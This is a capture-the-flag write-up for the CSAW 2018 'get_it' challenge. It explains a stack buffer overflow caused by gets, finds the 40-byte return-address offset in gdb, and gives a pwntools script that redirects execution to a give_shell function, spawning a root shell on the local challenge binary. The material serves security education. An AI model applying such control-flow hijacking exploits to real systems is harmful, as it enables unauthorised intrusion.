# Csaw 2018 Quals Getit

notes from [guyinatuxedo](https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html)

First grab the binary:
```
wget -O  get_it https://github.com/osirislab/CSAW-CTF-2018-Quals/raw/master/pwn/get_it%3F/get_it
chmod +x get_it
```

Take a look at it:
```
$   file ./get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
$   pwn checksec get_it
[*] '/root/github/binary-exploitation/stack-buffer-overflows/csaw-2018/get_it/get_it'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	./get_it
Do you gets it??
8675309
```

This is a 64 bit binary with a non-executable stack. When we run it we see that it prompts us for input. Let's take a look at the main function in ghidra.
```c
undefined8 main(void)

{
  char input [32];
  
  puts("Do you gets it??");
  gets(input);
  return 0;
}
```

It has a call to ```gets``` which is bad, because gets has no size restriction on the amount of data it will scan. This means that we can write more data to ```input``` than it can hold (32 bytes). This will overwrite other things in memory.

When ```ret``` is called, the saved instruction pointer ```rpb+0x8``` is executed. This address is on the stack, so we can reach it with ```gets```. The offset between the start of our input and the return address is 40 bytes. The first 32 bytes come from ```input```. After that, there are no variables between ```input``` and the saved base pointer. After that, we have 8 bytes for the saved base pointer.

We can see the memory in gsb:
```asm
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:     push   rbp
   0x00000000004005c8 <+1>:     mov    rbp,rsp
   0x00000000004005cb <+4>:     sub    rsp,0x30
   0x00000000004005cf <+8>:     mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 <+15>:    mov    edi,0x40068e
   0x00000000004005db <+20>:    call   0x400470 <puts@plt>
   0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
   0x00000000004005e4 <+29>:    mov    rdi,rax
   0x00000000004005e7 <+32>:    mov    eax,0x0
   0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
   0x00000000004005f1 <+42>:    mov    eax,0x0
   0x00000000004005f6 <+47>:    leave  
   0x00000000004005f7 <+48>:    ret    
End of assembler dump.
gef➤  b *0x4005f1
Breakpoint 1 at 0x4005f1                                                                                                                                                                                          
gef➤  r                                                                                                  
Starting program: /root/github/binary-exploitation/stack-buffer-overflows/csaw-2018/get_it/get_it                                                                                                                 
Do you gets it??                                                                                                                                                                                                  
8675309 
```

We set a breakpoint right after the gets call:
```
gef➤  i f
Stack level 0, frame at 0x7fffffffe660:
 rip = 0x4005f1 in main; saved rip = 0x7ffff7e16e0b
 Arglist at 0x7fffffffe650, args: 
 Locals at 0x7fffffffe650, Previous frame's sp is 0x7fffffffe660
 Saved registers:
  rbp at 0x7fffffffe650, rip at 0x7fffffffe658
gef➤  x/g $rbp+0x8
0x7fffffffe658: 0x7ffff7e16e0b
gef➤  search-pattern 8675309
[+] Searching '8675309' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6026b0 - 0x6026b9  →   "8675309\n" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe630 - 0x7fffffffe637  →   "8675309"
```

We can see the byte offset is 40
```
$	python -c 'print(0x7fffffffe658 - 0x7fffffffe630)'
40
```

Looking in ghidra, we see other functions. There is one that gives us a shell.
```
void give_shell(void)

{
  system("/bin/bash");
  return;
}
```
We can see the execution of this function starts at 0x4005b6
```
gef➤  disas give_shell
Dump of assembler code for function give_shell:
   0x00000000004005b6 <+0>:     push   rbp
   0x00000000004005b7 <+1>:     mov    rbp,rsp
   0x00000000004005ba <+4>:     mov    edi,0x400684
   0x00000000004005bf <+9>:     call   0x400480 <system@plt>
   0x00000000004005c4 <+14>:    nop
   0x00000000004005c5 <+15>:    pop    rbp
   0x00000000004005c6 <+16>:    ret    
End of assembler dump.
```

We can just call the ```give_shell``` function by writing over the return address with ``0x4005b6```. We can use pwntools for this
```python
from pwn import *

target = process("./get_it")

payload = ""
payload += "0"*40 # padding to the return address
payload += p64(0x4005b6) # address of give_shell in little endian, will be new return

# send payload
target.sendline(payload)

# drop to shell
target.interactive()
```

Running the exploit
```
$	python get_shell.py 
[+] Starting local process './get_it': pid 193780
[*] Switching to interactive mode
Do you gets it??
$ whoami
root
$  
```
